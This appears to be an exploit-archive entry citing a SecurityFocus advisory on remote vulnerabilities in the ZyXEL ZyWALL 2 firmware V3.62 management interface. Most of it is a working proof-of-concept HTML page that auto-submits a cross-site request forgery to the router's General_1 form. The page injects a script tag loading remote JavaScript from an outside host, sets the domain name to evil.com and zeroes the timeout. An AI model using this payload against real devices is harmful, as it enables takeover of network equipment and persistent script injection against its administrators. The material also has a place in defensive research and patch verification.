@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/25262/info
+
+ZyXEL ZyWALL 2 is prone to multiple remote vulnerabilities that affect the management interface.
+
+An attacker can exploit these issues to carry out cross-site request forgery, HTML-injection, and denial-of-service attacks.
+
+ZyWALL 2 running with firmware V3.62(WK.6) is reported vulnerable to this issue. 
+
+ <html>
+  <body onload="document.CSRF.submit()">
+  <FORM name="CSRF" METHOD="POST"
+ACTION="http://192.168.1.1/Forms/General_1">
+  <INPUT NAME="sysSystemName" VALUE="<script src='http://nx.fi/X'>"
+  <INPUT NAME="sysDomainName" VALUE="evil.com">
+  <INPUT NAME="StdioTimout" VALUE="0">
+  <INPUT NAME="sysSubmit" VALUE="Apply">
+  </form>
+  </body>
+  </html>
